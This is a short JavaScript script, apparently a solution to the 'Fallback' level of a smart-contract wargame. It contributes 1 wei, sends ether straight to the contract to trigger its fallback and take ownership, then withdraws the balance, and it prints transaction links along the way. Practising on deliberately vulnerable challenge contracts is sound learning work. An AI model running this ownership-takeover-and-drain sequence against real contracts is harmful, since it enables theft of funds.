const {BLOCK_EXPLORER_URL, FALLBACK_INSTANCE_ADDRESS} = require('./utils');

async function main() {
	console.log('\x1b[33m%s\x1b[0m', '* * * * * * * * * * * * * * * ');
	console.log('Fallback level');

	if (!FALLBACK_INSTANCE_ADDRESS) {
		console.log('Fallback instance address not found');
		return;
	}

	console.log('Fallback instance address', FALLBACK_INSTANCE_ADDRESS);

	const [attacker] = await ethers.getSigners();
	const instance = await ethers.getContractAt("Fallback", FALLBACK_INSTANCE_ADDRESS);

	let tx = await instance.connect(attacker).contribute({value: ethers.utils.parseUnits("1", "wei")});
	console.log(`Transaction hash : ${BLOCK_EXPLORER_URL}/${tx.hash}`);

	await tx.wait(1);

	tx = await attacker.sendTransaction({to: FALLBACK_INSTANCE_ADDRESS, value: ethers.utils.parseUnits("1", "wei")});
	console.log(`Transaction hash : ${BLOCK_EXPLORER_URL}/${tx.hash}`);

	await tx.wait(1);

	tx = await instance.connect(attacker).withdraw();
	console.log(`Transaction hash : ${BLOCK_EXPLORER_URL}/${tx.hash}`);

	await tx.wait(1);

	console.log('\x1b[32m%s\x1b[0m', 'Fallback level. Done !!!');
	console.log('\x1b[33m%s\x1b[0m', '* * * * * * * * * * * * * * * ');
}

module.exports = main;
